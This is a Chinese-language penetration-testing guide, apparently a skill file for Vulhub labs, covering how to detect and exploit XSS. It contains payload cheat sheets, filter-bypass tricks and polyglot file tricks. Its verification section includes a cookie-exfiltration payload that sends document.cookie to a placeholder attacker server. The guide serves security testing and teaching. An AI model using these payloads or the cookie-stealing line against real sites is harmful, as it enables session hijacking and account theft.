---
name: vulhub-xss
description: xss 类型漏洞的通用抽象探测与利用方案
version: 1.0
---

# XSS 抽象化通用渗透与利用指南

## [1] 通用探测思路 (Detection Methodology)

XSS漏洞的核心在于攻击者可控的输入最终被作为HTML或JavaScript代码在受害者浏览器中执行。基于提供的实例，可以抽象出以下通用探测路径：

1.  **文件上传与解析点**：重点关注任何允许用户上传文件的接口。探测点不仅限于文件名，更在于文件内容本身。如果应用（如PDF阅读器、图像预览器）会解析并渲染上传文件的内容，那么恶意构造的文件内容（如嵌入JavaScript的PDF或伪装成图片的HTML文件）是极佳的XSS攻击向量。
2.  **动态内容生成与错误处理**：寻找应用动态生成HTML页面的地方，特别是错误信息、调试信息、用户输入回显处。当应用处于调试模式时，其错误报告页面往往缺乏足够的输出编码，可能将用户输入（如URL参数、表单数据、数据库记录）直接嵌入到HTML响应中。
3.  **参数与路径注入**：检查所有用户可控的输入点，包括URL查询参数（`?key=value`）、POST数据、HTTP头（如`User-Agent`, `Referer`）、甚至URL路径本身。这些输入点如果未经妥善处理就被放入`<script>`标签、HTML属性（如`onerror=`、`href=`）、或CSS样式中，都可能触发XSS。
4.  **存储型与反射型上下文**：
    *   **反射型**：Payload通过一次请求（如点击一个恶意链接）即时在响应中呈现并执行。探测时需观察输入是否被原样“反射”回页面。
    *   **存储型**：Payload被保存到服务器（如数据库、文件系统、评论内容），并在其他用户访问特定页面时被加载执行。文件上传漏洞通常是存储型XSS。

## [2] 经典漏洞原型与 Payload 字典 (Cheat Sheet)

以下Payload根据其执行上下文和注入点进行分类，已剥离具体CVE信息，仅保留核心攻击模式。

### 上下文：HTML 标签/属性内注入
当可控输入被直接放置在HTML标签内部或属性值中时使用。
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<a href="javascript:alert(1)">Click</a>
```

### 上下文：文件内容注入（恶意文件构造）
当应用会解析并执行文件中的代码时，构造特殊格式的文件。
```javascript
// 伪代码：创建一个表面是GIF/PDF，但实际包含可执行脚本的文件结构。
// 例如，在文件头部符合格式要求后，嵌入HTML/JS代码。
/* PDF对象定义中包含JavaScript动作 */
<< /Type /Action /S /JavaScript /JS "(app.alert(1))" >>
/* 或在一个看似正常的图片文件末尾追加HTML脚本标签 */
GIF89a...<script>alert(1)</script>
```

### 上下文：URL 参数直接回显至页面
输入通过URL参数传递并直接写入页面HTML。
```http
http://target/create_user/?username=<script>alert(1)</script>
http://target/search?q="><script>alert(1)</script>
```

### 上下文：存储路径/资源定位
利用应用对上传文件的存储和访问逻辑，使恶意文件被当作静态资源加载。
```
/sites/default/files/pictures/[日期目录]/malicious_file.gif
```
（该路径本身不是Payload，但指明了攻击文件最终可被浏览器访问并触发执行的存储位置）

## [3] 变体与特殊绕过技巧 (Bypass & Tricky Variants)

1.  **绕过基础过滤（标签/事件）**：
    *   **大小写混淆**：`<ScRiPt>`, `<IMG SRC=x ONERROR=alert(1)>`
    *   **嵌套与混淆**：`<scr<script>ipt>`, `<img src=x `onerror`=alert(1)>` (使用反引号)
    *   **使用非标准标签/事件**：`<svg><script>alert(1)</script>`, `<details open ontoggle=alert(1)>`

2.  **绕过空格/字符过滤**：
    *   **Tab/换行符替代空格**：`<img/src=x/onerror=alert(1)>`
    *   **使用`/`代替空格分隔属性**（在某些上下文中有效）。
    *   **HTML编码/URL编码**：`<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>`

3.  **利用文件解析特性**：
    *   **多类型文件（Polyglots）**：构造一个同时是合法GIF/PDF和合法HTML的文件。浏览器或解析库可能根据上下文以不同方式解释同一文件，导致脚本执行。
    *   **缺失或异常扩展名**：上传无扩展名或扩展名与内容类型不符的文件，可能诱使服务器错误地将其识别为可执行内容（如`text/html`），或使安全检查失效。

4.  **利用调试/错误处理机制**：
    *   当应用开启调试模式时，错误信息常包含未编码的请求参数、数据库查询语句或变量值。注入的Payload可能通过这些信息渠道被输出到页面。

## [4] 回显与成功判定基准 (Verification)

XSS漏洞的成功判定核心是：**确认攻击者可控的输入能够导致任意JavaScript代码在目标上下文（受害者浏览器）中执行**。

1.  **直接观察法（反射型/基于DOM型）**：
    *   **弹窗**：使用`alert(document.domain)`或`alert(1)`是最直接的验证。成功弹出包含目标域或数字1的警告框即证明漏洞存在。
    *   **页面内容改变**：使用`document.body.innerHTML="HACKED"`等Payload，观察页面内容是否被篡改。
    *   **开发者工具控制台**：查看是否有JavaScript错误，或执行`console.log`类Payload并在浏览器控制台查看输出。

2.  **间接证明法（存储型/盲注）**：
    *   **外部资源加载**：使用Payload尝试加载一个外部资源，如 `<img src=http://your-collaborator-domain>?v=` + `document.cookie`。如果在你的服务器日志中收到了该请求，证明脚本已执行。
    *   **盲打Cookie**：对于存储型XSS，使用 `new Image().src='http://your-server/steal?c='+encodeURIComponent(document.cookie)` 这类Payload，然后检查你的服务器是否收到来自受害者浏览器的、包含其Cookie的请求。

3.  **文件上传类XSS验证**：
    *   成功上传构造的恶意文件后，**直接使用浏览器访问该文件的存储URL**。如果脚本执行（如弹窗），则漏洞存在。
    *   观察应用是否在页面中引用了该上传文件（如作为图片`<img src="...">`），如果引用处触发了`onerror`等事件，同样证明漏洞存在。

**通用基准**：无论漏洞表现形式如何，只要能证明通过精心构造的输入，可以**在目标域的安全上下文下**执行**非预期的**JavaScript代码，即可判定XSS漏洞利用成功。